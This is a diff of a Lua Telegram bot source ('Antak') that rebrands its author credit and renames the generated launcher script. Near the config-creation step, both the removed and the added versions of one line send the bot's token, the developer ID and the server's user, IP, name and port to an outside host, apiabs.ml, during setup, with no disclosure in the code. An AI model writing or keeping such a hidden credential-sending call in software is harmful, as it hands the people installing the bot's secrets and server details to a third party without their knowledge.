@@ -1,5 +1,5 @@
 ------------------------------------------------
--- This Source Was Developed By (Rio) @tsttt.--
+-- This Source Was Developed By (Rio) @LTILTT.--
 --   This Is The Source Channel @TeAmAnTaK .   --
 --                - Antak -                 --
 --        -- https://t.me/TeAmAnTaK --         --
@@ -77,8 +77,8 @@ Antak = DevRio:get(Server.."TokenAntak"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdAntak")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/David/index.php?Get=Antak&DevId="..DevRio:get(Server.."IdAntak").."&TokenBot="..DevRio:get(Server.."TokenAntak").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-file = io.open("Antak.sh", "w")  
+https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdAntak").."&TokenBot="..DevRio:get(Server.."TokenAntak").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+file = io.open("Antak-Fatime.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/Antak
@@ -108,7 +108,7 @@ cd $HOME/Antak
 while(true) do
 rm -fr ../.telegram-cli
 screen -S Antak -X kill
-screen -S Antak ./Antak.sh
+screen -S Antak ./Antak-Fatime.sh
 done
 ]]) 
 file:close() 
@@ -13536,7 +13536,7 @@ end
 --     Source Antak     --
 end 
 ------------------------------------------------
--- This Source Was Developed By (Rio) @tsttt.--
+-- This Source Was Developed By (Rio) @LTILTT.--
 --   This Is The Source Channel @TeAmAnTaK .   --
 --                - Antak -                 --
 --        -- https://t.me/TeAmAnTaK --         --
